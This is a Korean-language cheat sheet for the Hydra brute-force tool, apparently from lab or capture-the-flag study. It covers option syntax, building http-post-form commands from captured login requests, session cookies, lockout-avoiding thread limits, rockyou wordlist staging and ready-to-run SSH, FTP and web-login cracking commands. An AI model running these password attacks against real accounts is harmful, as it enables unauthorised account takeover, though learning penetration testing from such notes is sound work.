# hydra 사용법 정리

## 개요

Hydra는 다양한 프로토콜(ssh, ftp, http 등)에 대해 빠른 무차별 대입(brute-force) 공격을 지원하는 도구다. 주로 패스워드 크래킹, 인증 우회 테스트에 활용된다.

---

## 주요 옵션

- `-t <동시스레드수>` : 병렬 연결 수(기본 16, 속도 조절)
- `-T <작업수>` : 전체 동시 작업 수(-M으로 여러 대상 공격 시, 기본 64)
- `-M <파일>` : 대상 IP를 한 줄씩 나열한 파일로 여러 대상 동시 공격
- `-V` : 시도하는 ID/PW 조합을 모두 출력
- `-f` : 첫 성공 시도 후 종료
- `-o <파일명>` : 결과를 파일로 저장
- `-s <포트번호>` : 포트 지정
- `-e nsr` : 빈 패스워드(n), 사용자명=패스워드(s), 역순(r)도 시도
- `-u` : 사용자별로 패스워드 리스트를 모두 시도 후 다음 사용자로
- `-w <초>` : 타임아웃 지정

---

## 기본 명령어 구조

```bash
hydra [옵션] -l <사용자명> -P <패스워드리스트> <타겟> <서비스>
```

- `-l <사용자명>` : 단일 사용자명 지정
- `-L <사용자명파일>` : 사용자명 리스트 파일 지정
- `-p <패스워드>` : 단일 패스워드 지정
- `-P <패스워드리스트>` : 패스워드 리스트 파일 지정
- `<타겟>` : 공격 대상 IP 또는 도메인
- `<서비스>` : ssh, ftp, http-get 등 서비스명

---

## http-post-form 문법 분석

```text
hydra [옵션] <타겟> http-post-form "<경로>:<본문>:<판정조건>[:<추가옵션>]"
```

콜론(`:`)으로 구분되는 3~4개 구역:

- 첫 번째 구역: POST를 보낼 경로 (예: `/login/index.php`)
- 두 번째 구역: 전송 본문. `^USER^`, `^PASS^` 자리에 목록 값이 대입됨. hidden 필드도 모두 포함
- 세 번째 구역: 성공/실패 판정 조건
  - `F=문구` : 응답에 이 문자열이 있으면 실패 (일반적)
  - `S=문구` : 응답에 이 문자열이 있으면 성공 (실패 페이지 구분이 애매할 때)
- 네 번째 구역(선택): 추가 헤더. `H=헤더이름:\ 값` 형식, 콜론은 `\:`로 이스케이프

선택 구역 안의 콜론은 반드시 `\:`로 이스케이프한다. 그대로 두면 구역 구분자로 해석되어 문법이 깨진다.

---

## 로그인 폼 분석 → hydra 조립 절차

원시 요청(Burp/DevTools 캡처)을 hydra 명령으로 바꾸는 정석 과정.

### 1단계: 폼 구조 확인

```bash
curl -s http://<대상>/login/ | grep -E '<form|<input'
```

- `<form action>` 에서 POST 경로, `<input name>` 에서 필드명 확인
- `hidden` 필드(s_mod, s_pg, CSRF 토큰 등)를 여기서 찾는다
- hidden 필드를 빼먹으면 모든 시도가 실패 처리되어 브루트포스가 조용히 무의미해진다

### 2단계: 실패 응답 확인

틀린 값으로 한 번 제출(Burp 또는 브라우저 DevTools Network 탭)해서 응답의 실패 문구를 확인한다. 이 문구를 `F=`에 공백까지 정확히 복사한다.

### 3단계: 조립

캡처한 요청:

```text
POST /login/index.php
Cookie: ISPCSESS=n5g33db3sjduau5fkoocckdvss

username=test&password=test2&s_mod=login&s_pg=index
```

조립 결과:

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -t 16 -f 192.168.110.101 http-post-form \
  "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong"
```

- `test2` 자리를 `^PASS^`로 치환하고, 고정값(hidden 필드)은 그대로 둔다

### 세션 쿠키가 필요한 폼

```bash
# 1) 세션 쿠키 발급 (-w "%{http_code}" 로 200 확인 후 진행)
curl -s -c c.txt -o /dev/null -w "%{http_code}\n" http://<대상>/login/

# 2) 쿠키값 추출
COOKIE=$(grep ISPCSESS c.txt | awk '{print $7}')

# 3) H= 옵션으로 쿠키 헤더 추가
hydra -l admin -P pass.txt -t 16 -f <대상> http-post-form \
  "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong:H=Cookie:\ ISPCSESS=$COOKIE"
```

- `-c c.txt`는 쿠키 저장(-b c.txt는 읽어서 요청에 실기)
- 세션 쿠키는 유휴 상태로 만료된다. 오래 걸리는 실행은 도중에 쿠키가 죽어 이후 시도가 전부 실패하므로, 작은 목록 단위로 쿠키를 재발급하며 돌린다

### HTTPS 로그인 폼

```bash
hydra -l admin -P pass.txt <대상> https-post-form \
  "/login:username=^USER^&password=^PASS^:F=failed"
```

- 443은 `http-post-form`이 아니라 `https-post-form`
- 비표준 포트는 `-s 8443` 처럼 병기

---

## 전부 실패할 때 체크리스트

모든 시도가 실패로 나오면 도구 문제가 아니라 조립 문제인 경우가 대부분이다. 위에서부터 순서대로 확인:

1. `F=` 문구가 응답 복사본과 정확히 일치하는지 (오탈자, 공백)
2. hidden 필드를 본문에 다 넣었는지
3. 세션 쿠키가 필수인지 (쿠키 없이 수동 POST 해보면 안다) → `H=Cookie:` 추가
4. CSRF 토큰처럼 요청마다 바뀌는 값이 있는지 → hydra 부적합, Burp Intruder 매크로 또는 python 루프로 대체
5. HTTPS인데 `http-post-form`으로 돌리지 않았는지 → `https-post-form`
6. 폼 값에 특수문자가 있는지 → hydra는 URL 인코딩 없이 그대로 보낸다. 인코딩이 필요하면 python으로
7. 계정 잠금/차단 의심 → `-t 4` 이하로 낮추고 최소 목록부터 재시도

---

## 단어장 운용

```bash
# rockyou는 빈도순(흔한 비밀번호가 앞쪽). 긴 실행 전 앞부분만 잘라 쓰기
head -n 100000 /usr/share/wordlists/rockyou.txt > /tmp/rockyou-top100k.txt
```

- 10k 목록 → rockyou 상위 100k → full rockyou 순서로 단계적 시도
- full rockyou는 1,400만 줄이라 수 시간이 걸리고, 그 사이 세션 쿠키가 만료될 수 있다
- 실전 환경은 계정 잠금/차단이 있으니 상위 1000개 같은 최소 목록부터 시작

---

## 자주 쓰는 예시

### 1. SSH 브루트포스

```bash
hydra -l root -P rockyou.txt 192.168.0.10 ssh
```

- root 계정에 대해 rockyou.txt의 패스워드로 시도

### 2. 여러 사용자명, 패스워드 조합

```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 ftp
```

- users.txt의 모든 사용자와 passwords.txt의 모든 패스워드 조합 시도

### 3. 특정 포트 지정

```bash
hydra -l admin -P pass.txt -s 2222 192.168.1.5 ssh

```

- 2222 포트의 ssh 서비스에 대해 시도

### 4. HTTP POST 로그인 크래킹

```bash
hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form \
"/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"

hydra -l molly -P rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.106.187 -t 4
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.201.106.187 -t 4 ssh
```

- 로그인 실패시 출력되는 문구(F=)를 정확히 지정해야 함

---

## 참고

- 서비스별로 입력 포맷이 다를 수 있으니, `hydra -U`로 지원 서비스와 예시 확인 가능
- 너무 많은 요청은 차단될 수 있으니, 속도(-t) 조절 필요
- 결과는 항상 수동으로 검증할 것
- 세션 쿠키나 CSRF 토큰 때문에 hydra가 안 통하는 폼은 ffuf(-H 헤더), Burp Intruder(매크로), python(requests 루프)으로 대체한다
